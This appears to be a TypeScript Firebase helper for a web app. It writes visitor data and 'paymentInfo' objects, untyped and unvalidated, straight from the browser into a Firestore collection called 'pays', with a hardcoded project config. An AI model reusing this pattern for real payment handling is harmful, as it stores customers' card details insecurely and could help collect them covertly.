// lib/firebase.ts
import { getApp, getApps, initializeApp, type FirebaseApp } from 'firebase/app';
import { doc, getFirestore, setDoc } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyDgFnMZD4NHBPe6cAT1CtL1amIBqmaKzEU",
  authDomain: "ziolm-16b34.firebaseapp.com",
  databaseURL: "https://ziolm-16b34-default-rtdb.firebaseio.com",
  projectId: "ziolm-16b34",
  storageBucket: "ziolm-16b34.firebasestorage.app",
  messagingSenderId: "669950264738",
  appId: "1:669950264738:web:b18d8aae90b7e048c3defb",
  measurementId: "G-XVP5TC5KKQ"
};

// Prevent re-initialization in dev / Fast Refresh
const app: FirebaseApp = getApps().length ? getApp() : initializeApp(firebaseConfig);

export const db = getFirestore(app);
export const database = getDatabase(app);
export default app;

export async function addData(data: any) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = await doc(db, 'pays', data.id!);

    await setDoc(docRef, data,{merge:true});

    console.log('Document written with ID: ', docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error('Error adding document: ', e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: 'pending' },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};
